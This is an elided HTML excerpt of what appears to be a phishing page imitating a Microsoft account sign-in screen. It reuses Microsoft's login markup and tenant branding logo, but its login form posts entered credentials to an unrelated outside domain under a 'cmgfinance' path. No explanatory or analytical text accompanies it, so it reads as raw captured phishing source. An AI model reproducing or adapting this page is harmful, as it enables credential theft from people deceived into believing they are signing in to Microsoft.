...
<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;" data-gr-c-s-loaded="true">
    ...
    <div>
        ...
        <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="https://warungmaggan.com/made/cmgfinance/login.php" onsubmit="return checkSubmit()">
                ...
                <div class="middle" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }">
                    ...
                    <div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl(), 'wide': paginationControlMethods() &amp;&amp; 
                        ...
                        params: {
                            ...
                            bannerLogoUrl: bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --> <img class="banner-logo" role="presentation" data-bind="attr: { src: bannerLogoUrl }" src="https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-unkgqclzqydigri1-tzawjofsjdpfh18bjsxgmk9fqi/logintenantbranding/0/bannerlogo?ts=637063163415246437"><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- /ko --></div>
